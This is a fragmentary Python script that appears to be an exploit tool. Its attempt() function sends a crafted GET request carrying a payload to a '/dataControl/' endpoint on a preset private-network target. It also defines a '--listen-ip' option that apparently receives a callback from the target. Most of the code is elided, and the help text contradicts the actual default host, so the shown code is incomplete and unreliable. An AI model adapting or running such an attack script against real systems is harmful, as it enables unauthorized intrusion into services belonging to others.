...
def attempt(host, port, target_bytes, body):
    ...
    a.sendall((f"GET /dataControl/{payload} HTTP/1.1\r\n"
               f"Host:www.dikong.com\r\n").encode("latin-1"))
    time.sleep(0.05)
...
def main():
    ...
    parser.add_argument("--host", default="192.168.110.121",
                        help="target host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=30234,
    ...
    parser.add_argument("--listen-ip", type=str, default="192.168.130.51",
